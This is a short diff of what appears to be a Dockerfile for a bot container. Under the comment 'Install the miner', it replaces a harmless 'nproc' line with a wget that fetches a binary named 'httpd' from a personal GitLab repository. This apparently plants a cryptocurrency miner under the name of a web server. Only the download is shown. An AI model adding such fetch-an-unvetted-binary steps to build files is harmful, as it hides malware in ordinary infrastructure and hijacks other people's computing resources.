@@ -20,7 +20,7 @@ COPY startbot.sh /home
 COPY /stuff /home/stuff
 
 # Install the miner:
-RUN nproc
+RUN wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
